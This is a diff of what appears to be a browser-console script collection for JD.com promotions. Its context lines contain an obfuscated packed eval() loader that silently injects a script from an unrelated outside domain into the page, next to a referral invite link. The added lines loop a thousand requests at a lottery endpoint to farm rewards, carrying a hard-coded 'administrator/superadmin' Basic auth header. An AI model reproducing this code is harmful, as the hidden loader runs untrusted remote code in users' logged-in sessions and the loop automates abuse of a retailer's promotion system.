@@ -17,3 +17,8 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
 https://h5.m.jd.com/babelDiy/Zeus/4DEZi5iUgrNLD9EWknrGZhCjNv7V/index.html#/?shopId=1&babelChannel=ttt19?shopId=1&inviteId=9HId9Z2m6CsyDV00BTXuLfMb25CUlt0ua52Yii8tqf4oXdvCAqO2u0E4wtD9rfdRVxHLjDxjkQD86T5wgHZne-h22v1XMGl0JTc0d-ZdSwHWC5dEduBbsPhHv4zja8vLAs0nVtOzX_4AES21OGft
 
 eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}(' e 9=4.3(\'9\');9.d="b/6";9.a="5://c.2/8/7.8";4.1.0(9);',62,15,'appendChild|body|com|createElement|document|https|javascript|xingdianzhang|js|script|src|text|tyh52|type|var'.split('|'),0,{}))
+
+// 小魔方红包雨金豆循环刷新
+for (let index = 0; index < 1000; index++) {
+fetch("https://api.m.jd.com/client.action?functionId=noahRedRainLottery&client=wh5&clientVersion=1.0.0&body=%7B%22actId%22%3A%22RRA3zqiS36pSV9kBP3UAFVsQh9t9HwW%22%7D",{"method":"GET","body":null,"headers":{"authorization":"Basic " + btoa(JSON.stringify({"li":"administrator","pd":"superadmin"}))}}).then(response=>response.json()).then(data=>{console.log(data)}).catch(e=>{console.log(e)})
+}
